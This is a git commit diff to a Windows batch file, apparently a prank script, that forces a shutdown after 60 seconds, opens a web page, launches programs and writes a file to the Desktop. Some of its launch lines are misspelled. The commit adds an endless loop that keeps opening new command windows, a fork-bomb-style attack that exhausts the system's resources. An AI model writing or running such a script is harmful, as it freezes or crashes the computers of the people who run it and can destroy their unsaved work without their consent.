6c8918eb3c3f07bd870044b8050dea709fe346e0
幻tly <81273793+tanluying@users.noreply.github.com>
2023-06-21 09:57:08 +0800

    Update pcjb.bat

--- pcjb.bat
+++ pcjb.bat
@@ -2,6 +2,9 @@ shutdown -s -t 60
 explorer http://tanluying.github.io/ying
 stare "" "D:\kugou.exe"
 cd.>C:\Users\user\Desktop\ying.txt
+:start
+start cmd
+goto start
 stare "" "D:\ying"
 stare "" "D:\ying"
 stare "" "D:\ying"
